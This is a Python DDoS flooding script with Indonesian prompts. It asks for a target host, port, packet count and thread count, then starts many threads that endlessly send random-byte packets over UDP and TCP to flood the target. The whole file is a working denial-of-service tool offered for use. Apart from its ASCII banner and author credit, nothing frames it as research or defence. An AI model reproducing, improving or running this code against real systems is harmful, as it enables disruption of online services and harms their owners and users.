#Author Sixninesix
#Kalo mau rename pm dc gw LenskyX#0001
import random
import socket
import threading
import os
import sys

os.system("clear")
print("""
\u001b[31m
╔╗╔╦═╦╦══╦═╦══╗
║╚╝╠╗║╠╗╗║╬║╔╗║
║╔╗╠╩╗╠╩╝║╗╣╠╣║
╚╝╚╩══╩══╩╩╩╝╚╝

╔══╦═╦═╗
║══╣╦╣╔╝
╠══║╩╣╚╗
╚══╩═╩═╝
""")

ip = str(input(" IP/HOST :"))
port = int(input(" PORT :"))
choice = str(input(" START DDOS? (y/n):"))
times = int(input(" JUMLAH PACKET YANG AKAN DIKIRIM :"))
threads = int(input(" JUMLAH THREADS YANG AKAN DIKIRIM:"))
def run():
	data = random._urandom(2046)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Sent!!!")
		except:
			print("[!] Error Connection Time Out!!!")

def run2():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Sent!!!")
		except:
			s.close()
			print("[*] Error Connection Time Out")
            

def run3():
	data = random._urandom(999)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Sent!!!")
		except:
			s.close()
			print("[*] Error Connection Time Out Connection Time Out")
            
  
def run4():
	data = random._urandom(828)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Sent!!!")
		except:
			s.close()
			print("[*] Error Connection Time Out")
            

def run5():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Sent!!!")
		except:
			s.close()
			print("[*] Error Connection Time Out")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
		th = threading.Thread(target = run4)
		th.start()
else:
		th = threading.Thread(target = run5)
		th.start()